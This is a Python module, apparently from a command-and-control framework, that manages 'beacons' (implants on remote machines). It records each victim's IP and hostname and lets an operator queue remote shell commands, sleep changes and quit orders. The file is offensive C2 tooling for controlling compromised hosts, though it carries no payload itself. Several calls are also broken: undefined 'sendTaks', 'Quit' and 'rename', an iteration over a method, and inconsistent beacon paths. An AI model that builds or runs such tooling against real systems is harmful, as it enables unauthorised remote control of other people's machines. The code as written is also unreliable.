from database import *
from util import *
from cryptor import *
import menu

import os
import time

from collections import OrderedDict
from shutil import rmtree
from base64 import b64decode

beacons = OrderedDict()

class Beacon:
    def __init__(self, name, listener, beaconIp, hostname, beaconType, key):
        self.name           = name
        self.listener       = listener
        self.beaconIp       = beaconIp
        self.hostname       = hostname
        self.beaconType     = beaconType
        self.key            = key
        self.beaconSleep    = 60
        self.beaconPath     = f'db/listeners/{self.listener}/beacon/{self.name}/'
        self.tasksPath      = f'{self.beaconPath}tasks'

        if os.path.exists(self.beaconPath) == False:
            os.mkdir(self.beaconPath)

        self.menu           = menu.Menu(self.name)

        self.menu.registerCommand("shell", "Execute a shell command", "<command>")
        self.menu.registerCommand("sleep", "Change beacon sleep time", "<second>")
        self.menu.registerCommand("clear", "Clear tasks", "")
        self.menu.registerCommand("quit", "Beacon to quit", "")

        self.menu.uCommands()
        self.Commands = self.menu.Commands

    # Sending beacon tasks
    def sendTask(self, task):
        # Windows Executable Payload
        if self.beaconType == "winexe":
            task = task
        else:
            pass

        with open(self.tasksPath, "w") as f:
            f.write(task)

    # Clearing beacon tasks
    def clearTask(self):
        if os.path.exists(self.tasksPath):
            os.remove(self.tasksPath)
        else:
            pass

    # Updating a beacon
    def updateBeacon(self):
        self.menu.name  = self.name
        self.beaconPath = f'db/listeners/{self.listener}/beacons/{self.name}/'
        self.tasksPath  = f'{self.beaconPath}tasks'

        if os.path.exists(self.beaconPath) == False:
            os.mkdir(self.beaconPath)

    # Renaming a beacon
    def renameBeacon(self, newName):
        task = "Rename " + newName
        self.sendTaks(task)
        progress(f'Waiting for beacon to change the name to {newName}...')
        while os.path.exists(self.tasksPath):
            pass
        return 0

    # Executing command via shell
    def shell(self, args):
        if len(args) == 0:
            error("Missing command!")
        else:
            command = " ".join(args)
            task    = "shell " + command
            self.sendTask(task)

    # Executing sleep command
    def sleep(self, args):
        if len(args) != 1:
            error("Invalid arguments!")
        else:
            time = args[0]

            try:
                temp = int(time)
            except:
                error("Invalid time entered!")
                return 0
            
            task = f'sleep {time}'
            self.sendTask(task)
            self.beaconSleep = int(time)
            removeFromDB(beaconsDB, self.name)
            writeToDB(beaconsDB, self)

    # Remove a beacon
    def removeBeacon(self):
        self.Quit()
        rmtree(self.beaconPath)
        removeFromDB(beaconsDB, self.name)
        menu.home()
        return 0

    # Exit a beacon
    def exitBeacon(self):
        self.sendTask("quit")
        progress("Waiting for beacon to quit...")
        for i in range(self.sleep):
            if os.path.exists(self.tasksPath):
                time.sleep(1)
            else:
                break
        return 0

    def beaconMenu(self, command, args):
        if command == "help":
            self.menu.showhelp()
        elif command == "menu":
            menu.home()
        elif command == "exit":
            menu.Exit()
        elif command == "shell":
            self.shell(args)
        elif command == "sleep":
            self.sleep(args)
        elif command == "clear":
            self.clearTask()
        elif command == "quit":
            self.exitBeacon()

    def interact(self):
        self.menu.clearScreen()
        while True:
            try:
                command, args = self.menu.parse()
            except:
                continue

            if command not in self.Commands:
                error("Invalid commands entered!")
            else:
                self.beaconMenu(command, args)

def activeBeacons():
    global beacons

    try: 
        temp = readFromDB(beaconsDB)
        beacons = OrderedDict()
        for i in temp:
            beacons[i.name] = i
    except:
        pass

# Checking if beacons are empty
def checkBeaconEmpty(flag):
    activeBeacons()
    if len(beacons) == 0:
        if flag == 1:
            error("No active beacons exist!")
            return True
        else:
            return True
    else:
        return False

# Checking if beacons exist
def checkBeaconExist(name, flag):
    activeBeacons()
    activeBeacon = []
    for i in beacons:
        activeBeacon.append(beacons[i].name)
    
    if name in activeBeacon:
        return True
    else:
        if flag == 1:
            error("Invalid beacon entered!")
            return False
        else:
            return False

# Listing beacons
def listBeacon():
    if checkBeaconEmpty(1) == False:
        success("Active Beacons: ")
        print("-" * 115)
        print('| {:<25} | {:<25} | {:<27} | {:<25} |'.format("Beacon Name", "Listener", "External IP", "Hostname"))
        print("-" * 115)
        for i in beacons:
            print('| {:<25} | {:<25} | {:<27} | {:<25} |'.format(beacons[i].name, beacons[i].listener, beacons[i].beaconIp, beacons[i].hostname))
        print("-" * 115)
        print(" ")

# Rename beacons
def renameBeacon(args):
    if len(args) != 2:
        error("Invalid arguments. (eg., [ beacons ] > rename <name> <new name>)")
    else:
        name    = args[0]
        newName = args[1]

        if checkBeaconExist(name, 1) == True:
            if checkBeaconExist(newName, 0) == True:
                error(f'Beacon {newName} already exists!')
                return 0

            beacons[name].rename(newName)

            if os.path.exists(beacons[name].beaconPath):
                rmtree(beacons[name].beaconPath)

            removeFromDB(beaconsDB, name)
            beacons[name].name = newName
            beacons[name].updateBeacon()
            writeToDB(beaconsDB, beacons[name])

            activeBeacons()
        else:
            return 0

# Quit beacon
def quitBeacon(name):
    beacons[name].Quit()

# Remove beacons
def removeBeacon(args):
    if len(args) != 1:
        error("Invalid arguments. (eg., [ beacons ] > remove <name>)")
    else:
        name = args[0]
        if checkBeaconExist(name, 1):
            quitBeacon(name)
            rmtree(beacons[name].beaconPath)
            removeFromDB(beaconsDB, name)
            activeBeacons()
        else:
            pass

# Assign listener for beacons
def assignListenerForBeacon(name):
    listener_list = []
    for i in beacons:
        if beacons[i].listener == name:
            listener_list.append(beacons[i].name)
    return listener_list

# Interact with beacons
def interactBeacon(args):
    if len(args) != 1:
        error("Invalid arguments. (eg., [ beacons ] > interact <name>)")
    else:
        name = args[0]
        if checkBeaconExist(name, 1):
            beacons[name].interact()
        else:
            pass

# Clear beacon tasks
def clearBeaconTaks(name):
    if checkBeaconExist(name, 0):
        beacons[name].clearTask()
    else:
        pass

# Output Results
def outputResults(name, result):
    if checkBeaconExist(name, 0) == True:
        if result == "":
            success(f'Beacon {name} completed task.')
        else:
            pass